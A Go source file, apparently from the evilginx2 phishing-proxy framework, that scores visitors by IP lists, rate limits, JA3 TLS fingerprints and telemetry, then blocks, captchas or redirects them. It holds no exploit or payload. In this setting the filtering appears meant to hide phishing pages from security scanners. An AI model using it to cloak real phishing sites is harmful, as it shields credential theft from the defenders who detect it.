package antibot

import (
	"crypto/tls"
	"net/http"
	"strings"

	"github.com/kgretzky/evilginx2/core/antibot/signals"
)

// AntibotVerdict defines the final evaluation result
type AntibotVerdict struct {
	Allow   bool
	Score   float64
	Action  string
	Reasons []string
}

// AntibotEngine orchestrates the various antibot signals
type AntibotEngine struct {
	IP        *signals.IPSignal
	Rate      *signals.TrafficShaper
	TLS       *signals.TLSSignal
	Telemetry *signals.TelemetrySignal
}

// NewAntibotEngine initializes a new engine instance
func NewAntibotEngine(ip *signals.IPSignal, rate *signals.TrafficShaper, tlsSig *signals.TLSSignal, telemetry *signals.TelemetrySignal) *AntibotEngine {
	return &AntibotEngine{
		IP:        ip,
		Rate:      rate,
		TLS:       tlsSig,
		Telemetry: telemetry,
	}
}

// Evaluate analyzes the incoming request through all the configured signals and returns a unified verdict
func (e *AntibotEngine) Evaluate(req *http.Request, clientIP string, tlsState *tls.ConnectionState, clientID string) AntibotVerdict {
	verdict := AntibotVerdict{
		Allow:   true,
		Score:   0.0,
		Action:  "allow",
		Reasons: make([]string, 0),
	}

	totalScore := 0.0

	// 1. Fast Path: IP Reputation and overrides
	if e.IP != nil {
		ipVerdict := e.IP.Evaluate(clientIP)
		if ipVerdict.IsWhitelisted {
			verdict.Action = "allow"
			verdict.Reasons = append(verdict.Reasons, ipVerdict.Reasons...)
			return verdict // immediate return for overrides/whitelist
		}
		if ipVerdict.IsBlacklisted {
			verdict.Allow = false
			verdict.Action = "block"
			verdict.Score = 1.0
			verdict.Reasons = append(verdict.Reasons, ipVerdict.Reasons...)
			return verdict // immediate return for blacklist
		}
	}

	// 2. Fast Path: Rate Limiting
	if e.Rate != nil {
		rateVerdict := e.Rate.Evaluate(req, clientIP)
		if rateVerdict.Action != "allow" {
			totalScore += rateVerdict.Score
			verdict.Reasons = append(verdict.Reasons, rateVerdict.Reason)
		}
	}

	// 3. Heavy Path: TLS / JA3 Fingerprinting
	if e.TLS != nil {
		remoteAddr := req.RemoteAddr
		tlsVerdict := e.TLS.Evaluate(remoteAddr)
		if tlsVerdict.Action != "allow" {
			totalScore += tlsVerdict.Score
			verdict.Reasons = append(verdict.Reasons, tlsVerdict.Reason)
		}
	}

	// 4. Heavy Path: Unified Telemetry (Behavior ML + Sandbox)
	if e.Telemetry != nil {
		telemVerdict := e.Telemetry.Evaluate(req, tlsState, clientID, clientIP)
		if telemVerdict.Action != "allow" {
			totalScore += telemVerdict.Score
			verdict.Reasons = append(verdict.Reasons, telemVerdict.Reason)
		}
	}

	// Determine final Action based on aggregated totalScore
	// (Scores represent relative confidences from each module; typical thresholds)
	verdict.Score = totalScore
	if totalScore >= 0.9 {
		verdict.Allow = false
		verdict.Action = "block"
	} else if totalScore >= 0.6 {
		verdict.Allow = false
		verdict.Action = "spoof" // Honeypot / redirect
	} else if totalScore >= 0.3 {
		verdict.Allow = false
		verdict.Action = "captcha" // Let them solve a captcha
	} else {
		verdict.Allow = true
		verdict.Action = "allow"
	}

	// For neatness, log reasons together
	if len(verdict.Reasons) > 0 {
		reasonString := strings.Join(verdict.Reasons, " | ")
		verdict.Reasons = []string{reasonString}
	}

	return verdict
}
